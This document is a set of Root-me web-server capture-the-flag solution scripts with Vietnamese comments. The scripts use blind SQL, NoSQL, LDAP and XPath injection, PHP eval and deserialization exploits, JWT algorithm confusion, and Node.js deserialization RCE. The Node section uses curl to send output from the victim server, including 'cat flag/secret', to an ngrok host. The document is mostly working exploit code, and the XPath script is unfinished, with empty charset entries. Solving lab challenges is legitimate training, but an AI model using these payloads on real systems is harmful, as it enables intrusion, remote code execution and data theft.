# Root-me Web Server

## LDAP injection - Blind

```python
import requests
import string

char = ''
# nên tự lấy letter, digits rồi ms ký tự, tiết kiệm thời gian brute-force
char = string.ascii_letters + string.digits + '!@#$%-_=+ ,.?}{[]'

url = 'http://challenge01.root-me.org/web-serveur/ch26/'

flag = ''
for i in range(30):
	print('[+]FIND at %i:' %(i))
	for c in char:
		payload = "admin*)(password=%s" %(flag + c)
		params = {'action':'dir','search':payload}
		r = requests.get(url, params=params)
		if '0 results' not in r.text:
			flag += c
			print("[+]FOUND: " + flag)
			break
```

## PHP - Truncation

```python
# https://www.root-me.org/en/Challenges/Web-Server/PHP-Path-Truncation
import requests

truncation = ''
for i in range(2048): # 4096/2: maximun string ở PHP<5.3 là 4096 characters, quá ->truncation(cắt bớt)
	truncation += '/.'

payload = 'hello/../admin.html' + truncation # hello:thư mục giả -> cần lừa include() đây là 1 path
r = requests.get('http://challenge01.root-me.org/web-serveur/ch35/index.php?page=' + payload)

#print(r.url);
print(r.text) # html code
```

## 	NoSQL injection - Authentication

```python
import requests

url = 'http://challenge01.root-me.org/web-serveur/ch38/'

# regex tìm match str-chr -> trùng ->pick lấy user, pass not equal '' -> luôn đúng
params = {'login[$regex]':'c','pass[$ne]':''}

r = requests.get(url, params=params)

print(r.text)
```

## NoSQL injection - Blind

```python
import requests # pip install requests

url = 'http://challenge01.root-me.org/web-serveur/ch48/'

def escapseMETAcharacter(j): # escapse meta chacracter have special meaning regular expression by backslash
	if j in ('.','[',']','{','}','*','\\','(',')','+','?','|','^','$',):
		return '\\' + j # escapse sequence
	return j

c = ''
for i in range(30):
	for j in range(32,127):
		j = escapseMETAcharacter(chr(j))

		# chall_name not injectable, cause of WAF, pass find substring
		params = {'chall_name':'nosqlblind','flag[$regex]': '^%s' %(c + j)} # ^ regular expression start string

		r = requests.get(url, params=params)

		if r.text.find('This is not') == -1: # true
			c += j # cớ sao ko auto nhất có thể
			print('VALID FLAG: %s' %(c))
			break 
		
# 3@sY_n0_5q7_1nj3c710n
```
## PHP - Eval

```python
import requests
import string

# a^b=c && c^b=a || ^: 1-0=1 0-1=1 | 00 11 = 0
# input bypass preg_match() string letters PHP vào eval RCE

def get_valid_string(expected, valids):
	word1 = ""
	word2 = ""
	
	for i in expected:
		for j in valids:
			result = chr(ord(i) ^ ord(j))
			if result in valids:
				word1 += result
				word2 += j
				break
	return word1, word2

valids = ""
for i in string.printable:
	if i not in string.ascii_letters: # không lấy ascii letters(a-zA-Z)
		valids += i

valids = valids[:len(valids)-3]
expected = "system"
word1, word2 = get_valid_string(expected, valids)

expected_2 = "cat '.passwd'" # lưu ý tên file có dấu . ở đầu sẽ dính syntax error, cần string hóa tên file
word3, word4 = get_valid_string(expected_2, valids)

# PHP có thể dùng toán tử ^(OR) xử lý STRING
payload = "('{}'^'{}')(('{}'^'{}'))".format(word1, word2, word3, word4) # system(cat .passwd)

print(payload)

data = {'input':payload}

r = requests.post('http://challenge01.root-me.org/web-serveur/ch57/index.php', data=data)

print(r.text)
```

## PHP - Serialization

```python
import requests
from urllib.parse import quote

login = {'login':'guest','password':'guest', 'autologin':1} # lấy Set-Cookie autologin
r = requests.post('http://challenge01.root-me.org/web-serveur/ch28/index.php', data=login)

# Set-Cookie: Là cookie server trả về để lần sau dùng cookie này autologin
print("Set-Cookie: ", r.headers['Set-Cookie'])

# urldecode autologin cookie, edit payload
payload = 'a:2:{s:5:"login";s:10:"superadmin";s:8:"password";b:1;}'
urlencode = quote(payload) # r'' : escapse sequence

autologin = {'Cookie':'autologin='+urlencode} # Header Cookie not Set_Cookie
print("\n\n", autologin, end='\n\n')

r_autologin = requests.get('http://challenge01.root-me.org/web-serveur/ch28/index.php', headers=autologin)
print(r_autologin.text)
```
## SQL injection - Authentication - GBK

```python
import requests
from urllib.parse import quote

url = 'http://challenge01.root-me.org/web-serveur/ch42/'

payload = "尐' or 1=1-- --" # server expecting valid GBK character ( không thể 0xa8)

data = {'login':payload,'password':'abc'}

r = requests.post(url, data=data)

print(r.text)
```
## SQL injection - File reading

```python
import requests

url = 'http://challenge01.root-me.org/web-serveur/ch31/'

# select id,username,null,email from ? where id = 
# hex(sql đọc hiểu được hex_string, encode bypass addslash() tức thêm \ trước ',")
# path file index root-me: /challenge/web-serveur/ch31/index.php
enc = '0x' + ':'.encode('utf-8').hex()
payload = '2 union select 2,null,null,concat_ws(%s,member_login,member_password) from member' %(enc)
params_1 = {'action':'members','id':payload}

r = requests.get(url, params=params_1)

print(r.text)
```
## SQL injection - Blind

```python
import requests
import string

url = 'http://challenge01.root-me.org/web-serveur/ch10/'
characters = string.printable
flag = ''

command = "SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='users'"

for i in range(0, 30):
	for c in characters:
		payload = f"hi_mom' or 1=1 and hex(substr(({command}),{len(flag)+1},1))=hex('{c}')-- -"
		data = {
			'username': payload,
			'password': '1'
		}
		print(flag+c)
		r = requests.post(url, data=data)
		if 'Your informations' in r.text:
			flag += c
			print('[FOUND] - '+ flag)
			break

# Tăng cường dùng hex, ascii convert để so sánh!
```
## SQL injection - Time based

```python
import requests

url = 'http://challenge01.root-me.org/web-serveur/ch40/'

flag = ''

for i in range(1,30):
	print('attemp at: %d' %(i))
	for j in range(32,127): # nếu là substring thì ta tìm kiếm nhị phân(ít hơn số lần request) nhưng bị blocked
		payload = "1; SELECT CASE WHEN strpos((select password from users where id=1 limit 1),$$%s$$)=%d THEN pg_sleep(999999) ELSE pg_sleep(0) END;-- -" %(chr(j),i)
		params = {'action':'member','member':payload}
		try:
			resp = requests.get(url, params=params, timeout=2)
		except:
			flag += chr(j)
			print('FLAG: ' + flag); print()
			break
		if j==126:
			flag += '~'
			print('Not found at %d(~)' %i)
			print('FLAG: ' + flag); print()

```
## SQL injection - Error

```python
import requests

url = 'http://challenge01.root-me.org/web-serveur/ch34/'

# sau order by thì liệt kê bằng dấu ',' thôi, tránh xóa ASC lỗi ko chạy đc function sau
# server chạy hàm cast đầu tiên sẽ exec query -> result varchar -> cast as int -> lỗi -> trả về lỗi cùng result
# offset(n): bỏ qua phần tử (vd: có 10 pt -> offset(4): 5->10); limit chỉ lấy 1 vì current table chỉ chứa 1 column

for i in range(100):
#	payload = 'ASC,cast((SELECT column_name from information_schema.columns limit 1 offset %d) as int)' %(i)
	payload = "ASC,cast((SELECT table_name FROM information_schema.tables limit 1 offset %s) as int)" %(i)
	params = {'action':'contents','order':payload}
	r = requests.get(url, params=params)
	print(r.text[442:]) # đếm số chữ rồi cắt thôi!



# payload = "ASC,cast((SELECT concat(us3rn4m3_c0l,p455w0rd_c0l) FROM m3mbr35t4bl3 limit 1) as int)"
# params = {'action':'contents','order':payload}
# r = requests.get(url, params=params)
# print(r.text)
```

## SQL injection - Insert

```python
import requests
import random

url = 'http://challenge01.root-me.org/web-serveur/ch33/'
username = random.randint(10000,99999)

# JSON
param_1 = {'action':'register'}
param_2 = {'action':'login'}

# INSERT INTO users(username,password,email) VALUES('$username','$password','$email')
payload = "(select flag from flag limit 0,1)"
email = "1'),('%s5','1',%s)-- -" %(username, payload)

data_1 = {'username':username,'password':'1','email':email}
data_2 = {'username':str(username) + '5','password':'1'}

# register 2 account
response_1 = requests.post(url, params=param_1, data=data_1)
# login account 2
response_2 = requests.post(url, params=param_2, data=data_2)

# find() : trả về vị trí của chuỗi
print(response_1.text[response_1.text.find("</form>"):])
print(response_2.text[response_2.text.find("Email : "):])

# payload:

# (select database()) : c_webserveur_33
# (select table_name from information_schema.tables where table_schema = 'c_webserveur_33' limit n,1) :
# memberes, flag
# (select column_name from information_schema.columns where table_name = 'flag' limit 0,1) : flag
# (select flag from flag limit 0,1) : flag is : moaZ63rVXUhlQ8tVS7Hw
```
## 	SQL Injection - Routed

```python
import requests

url = 'http://challenge01.root-me.org/web-serveur/ch49/index.php'

params = {'action':'search'}

# Ta encode query 2 thành hex để bypass filter(attack detect!)(SQL đọc hiểu được hex)
payload = "' UNION SELECT 0x" + ("' UNION SELECT password,email FROM users WHERE email LIKE '%admin%'-- -".encode('utf-8')).hex() + "-- -"

data = {'login':payload}

r = requests.post(url, params=params, data=data)

print(r.text)
```

## 	XPath injection - Blind

```python
# UNFINISH

import requests

url = 'http://challenge01.root-me.org/web-serveur/ch24/'

# element user(userid, username, password, email, account) -> check string-length element name, /* : all element
# pass_length = 0
# for i in range(3,20):
# 	payload = "2 and string-length(//user[2]/password/text())=%d" %i
# 	params = {'action':'user','userid':payload}
# 	r = requests.get(url, params=params)
# 	if 'XPath error' not in r.text:
# 		pass_length = i
# 		print("[+] - Password has %d characters!" %i)
# 		break
pass_length = 13

# Lập charset bởi slash bị blocked

charset = { # Mọi nguồn lực, thêm cả ký tự hoa
	'a':'//user[2]/account,1', 'b':'//user[1]/account,3', 'c':'//user[1]/account,5', 
	'd':'//user[2]/account,2', 'e':'//user[1]/account,9',
	'f':'', 'g':'//user[2]/email,12', 'h':'//user[2]/email,3', 'i':'//user[3]/email,2', 
	'k':'', 'l':'//user[5]/email,2', 'm':'//user[1]/email,9',
	'n':'//user[2]/username,4', 'o':'//user[2]/username,2', 'p':'', 'q':'', 
	'r':'//user[4]/username,3', 's':'//user[5]/username,4', 't':'//user[5]/email,7',
	'u':'//user[1]/account,2', 'v':'', 'w':'', 'x':'', 'y':'//user[4]/username,5', 
	'z':'//user[2]/email,11', '0':'string(0),1', '1':'string(1),1',
	'2':'string(2),1', '3':'string(3),1', '4':'string(4),1', '5':'string(5),1',
	'6':'string(6),1', '7':'string(7),1', '':'string(8),1', '9':'string(9),1',
	'@':'//user[3]/email,4',  '.':'//user[3]/email,8',

}

# for i in charset:
# 	print(i+' : '+'subtring(%s,1)' %charset.get(i))


password = ''
for i in range(1,pass_length+1):
	print('[-]-Finding at: %s' %i)
	for j in range(1, len(charset)):
		payload = "2 and substring(//user[2]/password/text(),%d, 1)=substring(%s,1)" %(i, charset.get(j))
		params = {'action':'user','userid':payload}
		r = requests.get(url, params=params)
		if 'XPath error' not in r.text:
			password += j
			print("[+] -> Password is: %s" %password)
			break
		if j==pass_length:
			password += '_'
			print("[+] -> Password is: %s" %password)
```

## PHP Unserialize Pop Chain

```php
<?php
 
$getflag = false;
 
class GetMessage {
    function __construct($receive) {
        if ($receive === "HelloBooooooy") {
            die("[FRIEND]: Ahahah you get fooled by my security my friend!<br>");
        } else {
            $this->receive = $receive;
        }
    }
 
    function __toString() {
        return $this->receive;
    }
 
    function __destruct() {
        global $getflag;
        if ($this->receive !== "HelloBooooooy") {
            die("[FRIEND]: Hm.. you don't see to be the friend I was waiting for..<br>");
        } else {
            if ($getflag) {
                include("flag.php");
                echo "[FRIEND]: Oh ! Hi! Let me show you my secret: ".$FLAG . "<br>";
            }
        }
    }
}
 
class WakyWaky {
    function __wakeup() {
        echo "[YOU]: ".$this->msg."<br>";
    }
 
    function __toString() {
        global $getflag;
        $getflag = true;
        return (new GetMessage($this->msg))->receive;
    }
}

// Mục tiêu: gọi __toString ở class WakyWaky để $getflag = true; rồi tạo object getMessage mà không trigger die ở construct

$mess = new GetMessage('a');
$mess->receive = 'HelloBooooooy'; // thỏa mãn điều kiện lấy flag ở __destruct()

$pad_wak = new WakyWaky();
$pad_wak->msg = $mess; // gán recieve property của obj này là 1 object GetMessage khác rồi gọi nó

$wak = new WakyWaky();
$wak->msg = $pad_wak; // gọi toString ở WakyWaky

$a = serialize($wak);
echo $a . "\n\n";

unserialize($a); // gọi __wakeUp()
```

**secret**: `uns3r14liz3_XXXXX_XXXXX_XXXXX`

## Node - Serialize

```js
var profile = {
 userName : function(){
 require('child_process').exec('curl http://5249-1-55-197-127.ngrok.io?c=`ls -la / | base64`', function(error, stdout, stderr) { console.log(stdout) });
 },
 passWord : "hello",
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(profile));
```

**serialize results**:
```json
{"userName":"_$$ND_FUNC$$_function(){\n require('child_process').exec('curl http://5249-1-55-197-127.ngrok.io', function(error, stdout, stderr) { console.log(stdout) });\n }","passWord":"hello"}
```

Later I figured out that we can use JavaScript’s Immediately invoked function expression (IIFE) for calling the function. If we use IIFE bracket ()after the function body, the function will get invoked when the object is created. It works similar to a Class constructor in C++.

But to prevent it get execute from our machine other than victim machine, we add it by hand and base64 encode it

**edited to get the flag**:
```json
{"userName":"_$$ND_FUNC$$_function(){\n require('child_process').exec('curl http://d657-1-55-197-127.ngrok.io?c=`cat flag/secret | base64`', function(error, stdout, stderr) { console.log(stdout) });\n }()","passWord":"hello"}
```
Notice `()` at the end of the function

**base64 encoded**:
```
eyJ1c2VyTmFtZSI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbigpe1xuIHJlcXVpcmUoJ2NoaWxkX3Byb2Nlc3MnKS5leGVjKCdjdXJsIGh0dHA6Ly9kNjU3LTEtNTUtMTk3LTEyNy5uZ3Jvay5pbz9jPWBjYXQgZmxhZy9zZWNyZXQgfCBiYXNlNjRgJywgZnVuY3Rpb24oZXJyb3IsIHN0ZG91dCwgc3RkZXJyKSB7IGNvbnNvbGUubG9nKHN0ZG91dCkgfSk7XG4gfSgpIiwicGFzc1dvcmQiOiJoZWxsbyJ9
```

And ....
```bash
curl 'http://challenge01.root-me.org:59067/' -H 'Cookie: profile=eyJ1c2VyTmFtZSI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbigpe1xuIHJlcXVpcmUoJ2NoaWxkX3Byb2Nlc3MnKS5leGVjKCdjdXJsIGh0dHA6Ly9kNjU3LTEtNTUtMTk3LTEyNy5uZ3Jvay5pbz9jPWBjYXQgZmxhZy9zZWNyZXQgfCBiYXNlNjRgJywgZnVuY3Rpb24oZXJyb3IsIHN0ZG91dCwgc3RkZXJyKSB7IGNvbnNvbGUubG9nKHN0ZG91dCkgfSk7XG4gfSgpIiwicGFzc1dvcmQiOiJoZWxsbyJ9'
```

**captured request from ngrok**:
```
GET /?c=WTNwUzNyMGQzYzBtcDRuWTFzQjRkIQo= HTTP/1.1
Host: d657-1-55-197-127.ngrok.io
User-Agent: curl/7.68.0
Accept: */*
X-Forwarded-For: 2001:bc8:35b0:c166::151
X-Forwarded-Proto: http
Accept-Encoding: gzip
```

**flag**: `Y3pS3r0d3c0mp4nY1sB4d!`


## JSON Web Token (JWT) - Public key

**References**:https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Hacking%20JSON%20Web%20Token%20(JWT)%20-%20Rudra%20Pratap.pdf

**Attacking JWT**:

1. The leakage of sensitive information
2. Modify the algorithm to none
3. Modify the algorithm RS256 to HS256 (leaked public key)
4. HS256 (symmetric encryption) key cracking

**Related tools**: https://github.com/jpadilla/pyjwt

Python script:

```python
import requests
import jwt # pip install pyjwt==0.4.3

url = 'http://challenge01.root-me.org/web-serveur/ch60/'
s = requests.Session()

r1 = s.get(url+'key') # request lấy public key

public = "\n".join(requests.get(url + "key").json()) + "\n" # join từng phần tử với new-line

token = jwt.encode({"username":"admin"}, key=public, algorithm='HS256') # sign jwt token với pub key
print(token)

headers = {
	'Authorization': 'Bearer ' + token.decode()
}

r = s.post(url+'admin', headers=headers) # request lấy flag

print(r.text)
```


